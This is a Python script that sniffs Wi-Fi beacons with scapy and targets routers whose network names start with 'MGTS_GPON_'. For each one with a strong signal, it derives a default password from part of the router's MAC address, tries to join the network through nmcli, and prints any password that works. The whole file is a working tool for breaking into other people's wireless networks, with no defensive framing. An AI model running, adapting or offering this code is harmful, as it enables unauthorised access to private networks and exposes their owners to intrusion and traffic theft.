# -*- coding: utf-8 -*-

import re
from subprocess import Popen, PIPE
from multiprocessing import Process, Queue

from scapy.layers.dot11 import Dot11, Dot11Elt

BROADCAST_BSSID = 'FF:FF:FF:FF:FF:FF'
MGTS_MASK_ESSID = 'MGTS_GPON_'


class PacketHandler(object):

    def __init__(self, power, connect_int):
        self.power_signal = power
        self.parsed_accesses_points = []
        self.weak_signal_mgts_accesses_points = []

        self.connect_queue = Queue()
        self.process_connect_to_access_point = Process(
                                        target=self.connect_to_the_access_point,
                                        args=(self.connect_queue,
                                              connect_int, ))
        self.process_connect_to_access_point.start()

    def parser_elements(self, packet):
        bssid = packet[Dot11].addr3.upper()
        essid = packet.info.decode('utf-8')
        power = -(256 - ord(packet.notdecoded[-2:-1]))

        if bssid in BROADCAST_BSSID or essid is '':
            return

        if bssid in self.parsed_accesses_points:
            return

        if bssid in self.weak_signal_mgts_accesses_points:
            if power >= self.power_signal:
                self.weak_signal_mgts_accesses_points.remove(bssid)

        item_access_point = None
        channel = int(ord(packet[Dot11Elt:3].info))

        if MGTS_MASK_ESSID in essid:
            if power >= self.power_signal:
                item_access_point = (essid, re.sub(':', '', bssid.lower()[6:]))
                print('BSSID: {} ESSID: {}'.format(bssid, essid))
                self.connect_queue.put(item_access_point)
                self.parsed_accesses_points.append(bssid)
            else:
                self.weak_signal_mgts_accesses_points.append(bssid)
        else:
            self.parsed_accesses_points.append(bssid)

    def connect_to_the_access_point(self, queue, connect_int):
        while True:
            try:
                item_queue = queue.get()
                command = 'nmcli -w 12 dev wifi con {} password {}'.format(*item_queue)
                command = command.split(' ')
                sub_proc = Popen(command, stdout=PIPE).communicate()
                if 'Connection with UUID' in sub_proc[0]:
                    print('''Successful Connect:
                        ESSID: {}
                        PASSWORD: {}'''.format(*item_queue))
                    close_connect = Popen(['nmcli', 'dev', 'disconnect', connect_int],
                                          stdout=PIPE).communicate()
            except KeyboardInterrupt:
                break
